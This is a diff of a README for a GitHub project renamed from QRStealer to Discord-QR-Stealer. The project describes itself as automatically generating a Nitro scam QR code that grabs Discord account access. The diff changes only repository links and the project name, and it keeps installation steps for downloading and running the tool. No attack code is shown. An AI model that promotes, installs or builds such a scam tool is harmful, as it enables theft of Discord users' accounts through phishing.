@@ -13,7 +13,7 @@ A program that automatically generates a Nitro scam QR code and grabs the Discor
 
 **NOTE:** ⭐ If you like the project, feel free to star it ⭐
   
-### If you caught any issues, please report it in [issues](https://github.com/extatent/QRStealer/issues)
+### If you caught any issues, please report it in [issues](https://github.com/extatent/Discord-QR-Stealer/issues)
 
 <details>
 <summary>Preview</summary>
@@ -40,7 +40,7 @@ A program that automatically generates a Nitro scam QR code and grabs the Discor
 ## Installation 
 
 #### Compiled version
-> Go to [Releases](https://github.com/extatent/QRStealer/releases/tag/Release) and download the Debug.zip file.
+> Go to [Releases](https://github.com/extatent/Discord-QR-Stealer/releases/tag/Release) and download the Debug.zip file.
   
 > Extract the Debug folder and open the QRStealer.exe file.
 
@@ -58,4 +58,4 @@ A program that automatically generates a Nitro scam QR code and grabs the Discor
 >NOTE: Make sure you have [Visual Studio 2019 or Visual Studio 2022](https://visualstudio.microsoft.com/downloads/) and [.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework) installed.
 
 ---
-### QRStealer is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/QRStealer/blob/main/LICENSE) file for details.
+### Discord-QR-Stealer is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/Discord-QR-Stealer/blob/main/LICENSE) file for details.
